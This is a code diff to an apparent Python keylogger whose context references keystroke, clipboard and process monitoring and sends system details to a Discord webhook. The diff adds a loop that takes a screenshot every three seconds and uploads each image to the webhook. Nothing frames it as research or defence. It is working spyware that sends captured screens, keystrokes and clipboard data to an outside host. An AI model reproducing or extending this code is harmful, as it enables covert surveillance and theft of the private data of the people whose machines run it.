@@ -35,6 +35,7 @@ special_keys = {
 
 username = os.getlogin()
 
+
 def run_bat_file():
     """Run the kill.bat file when the script starts."""
     bat_file_path = rf"C:\users\{username}\kl2.1\kill.bat"  # Update the path to your kill.bat file
@@ -144,11 +145,12 @@ def monitor_clipboard():
 
         except Exception as e:
             print(f"Error accessing clipboard: {e}")
-        
+
+
 def monitor_processes():
     running_processes = set()
     first_check = True  # Flag to handle the first delay
-    
+
     while True:
         current_processes = set(p.name() for p in psutil.process_iter())
         new_processes = current_processes - running_processes
@@ -169,6 +171,41 @@ def monitor_processes():
 
         running_processes = current_processes
         time.sleep(1)  # Check every 2 seconds after the first check
+
+
+def send_to_webhook_pic(filename):
+    """Send the screenshot to the Discord webhook."""
+    with open(filename, "rb") as file:
+        payload = {"content": "New Screenshot!"}
+        files = {"file": file}
+
+        try:
+            response = requests.post(WEBHOOK_URL, data=payload, files=files)
+            if response.status_code == 200 or response.status_code == 204:
+                print("Webhook message sent successfully.")
+            else:
+                print(f"Failed to send webhook message. Status code: {response.status_code}")
+        except Exception as e:
+            print(f"Error sending message to webhook: {e}")
+
+
+def screenshot():
+    while True:
+        print("Taking screenshot...")  # Debug print
+        now = datetime.now().strftime("%Y-%m-%d_%H-%M-%S")
+        filename = f"screen_{now}.png"
+
+        screenshotpng = pyautogui.screenshot()
+        screenshotpng.save(filename)
+
+        print(f"Screenshot saved as {filename}")  # Debug print
+
+        send_to_webhook_pic(filename)
+
+        time.sleep(3)  # Reduced for testing
+
+
+screenshot()  # Directly call the function
 
 
 # Start process monitoring in a separate thread
@@ -192,8 +229,10 @@ disk_info = psutil.disk_usage('/')
 
 send_to_webhook(f"CPU cores: {cpu_count}")
 send_to_webhook(f"CPU percent: {cpu_percent}%")
-send_to_webhook(f"Memory info: Total: {memory_info.total}, Available: {memory_info.available}, Used: {memory_info.used}, Percent: {memory_info.percent}%")
-send_to_webhook(f"Disk info: Total: {disk_info.total}, Used: {disk_info.used}, Free: {disk_info.free}, Percent: {disk_info.percent}%")
+send_to_webhook(
+    f"Memory info: Total: {memory_info.total}, Available: {memory_info.available}, Used: {memory_info.used}, Percent: {memory_info.percent}%")
+send_to_webhook(
+    f"Disk info: Total: {disk_info.total}, Used: {disk_info.used}, Free: {disk_info.free}, Percent: {disk_info.percent}%")
 
 # Start the keystroke monitor and clipboard monitor threads
 threading.Thread(target=keystroke_monitor, daemon=True).start()
